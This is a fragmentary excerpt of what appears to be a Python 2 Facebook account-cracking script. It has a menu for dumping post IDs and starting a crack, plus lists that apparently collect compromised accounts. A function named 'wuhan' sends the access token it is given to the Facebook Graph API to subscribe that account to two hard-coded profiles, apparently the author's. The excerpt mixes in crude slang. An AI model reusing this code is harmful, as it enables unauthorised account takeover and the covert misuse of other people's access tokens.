...
#------------------------------->
koh = '100072677928941'
xi_jimpinx = '137650905334173'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['Keren Banget', 'Hallo Bang', 'Ijin Pake Scripnya Ya Bang'])
...
def moch_yayan():
    ...
    print '\033[0;97m [03]. Dump ID Postingan'
    print '\033[0;97m [04]. Start Crarck'
...
# https://www.facebook.com/100072677928941/posts/137650905334173/?substory_index=1&app=fbl
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100072677928941/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100054912310434/subscribers?access_token=%s'%(kentod))
